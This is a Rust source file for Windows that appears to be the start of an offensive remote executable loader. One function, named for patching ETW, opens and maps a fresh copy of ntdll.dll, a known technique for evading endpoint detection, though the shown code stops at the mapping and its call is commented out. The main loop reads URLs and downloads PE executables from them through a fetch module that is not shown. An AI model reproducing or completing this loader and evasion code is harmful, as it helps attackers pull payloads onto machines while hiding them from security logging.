use windows::Win32::Storage::FileSystem::*;
use windows::{core::*, Win32::Foundation::*};    
use  windows::Win32::System::Memory::*;
use url::Url;

mod fetch;
mod error;

fn __new_ntdll_patch_etw()->Result<()>{
    // Path to NTDLL
    let ntdll_path = r"C:\Windows\System32\ntdll.dll";
    println!("[i] NTDLL Path:\t{}", ntdll_path);
    let ntdll_path: PCSTR = PCSTR(b"C:\\Windows\\System32\\ntdll.dll\0"[..].as_ptr() as *const u8);

    // Acquire the handle to NTDLL
    let hfile: HANDLE;
    unsafe{
        hfile = match CreateFileA(
            ntdll_path,
            FILE_ACCESS_FLAGS(windows::Win32::System::SystemServices::GENERIC_READ),
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_FLAGS_AND_ATTRIBUTES(0u32),
            None) {
                Ok(_res) => _res,
                Err(e) => {
                    eprintln!("Error occured as: {}({:?})", e, GetLastError());
                    return Err(e)
                }
            };
        }   

    // Check if handle is valid
    if hfile==INVALID_HANDLE_VALUE {
        let _err:  WIN32_ERROR;        
        unsafe{
            _err = GetLastError();
        }    
        eprintln!("Failed to acquire Handle to ntdll.dll({:?})", _err);
        let _err = _err.to_hresult();
        return Err(Error::new(_err, _err.message()));
    }
    
    println!("[i] Acquired Handle to ntdll.dll");

    // Prepare file mapping
    let _hfile_mapping: HANDLE;
    unsafe {
        _hfile_mapping = match CreateFileMappingA(
            hfile,
            None,
            PAGE_READONLY | SEC_IMAGE,
            0u32,
            0u32,
            PCSTR(std::ptr::null_mut() as *const u8)){
                Ok(_handle)=>_handle,
                Err(e)=>{
                    let _err:  WIN32_ERROR;        
                    _err = GetLastError();    
                    eprintln!("Error occured while acquiring File Handle: ({:?})", _err);
                    eprintln!("Error: {}", e);
                    let _err = _err.to_hresult();
                    return Err(Error::new(_err, _err.message()));
                }
            };
        }
    if _hfile_mapping.is_invalid(){
        eprintln!("Invalid File Mapping!");
        let _err:  WIN32_ERROR;        
        unsafe {_err = GetLastError();}    
        eprintln!("Error occured while acquiring File Handle: ({:?})", _err);
        let _err = _err.to_hresult();
        return Err(Error::new(_err, _err.message()));
    }
    Ok(())
}



fn main(){
    println!("[>] Exe who?");
    //new_ntdll_patch_etw().expect("Patching not okie");
    loop {
        println!();
        let url_str = match fetch::fetch_url(){
            Ok(_res) => _res,
            Err(_e) => continue,
        };
        
        // Check if user wants to exit
        if url_str.clone().as_str().trim().eq_ignore_ascii_case("quit") || 
            url_str.clone().as_str().trim().eq_ignore_ascii_case("exit") {
                break;
            }

        // Check for empty input
        if url_str.clone().as_str().trim().is_empty() {
            continue;
        }

        print!("[i] Fetching: {}", url_str);
        let url: Url = match Url::parse(url_str.as_str()) {
            Ok(_u) => _u,
            Err(e) => {
                eprintln!("[-] Failed to parse URL string");
                eprintln!("[-] Error: {}", e);
                continue;
            }
        };

        // Fetch PE
        match fetch::fetch_pe(url) {
            Ok(_v) => _v,
            Err(e) => {
                eprintln!("[!] Error occurred as: {}", e);
                continue;
            }
        };

    }

    println!("[i] Bye :D");
}
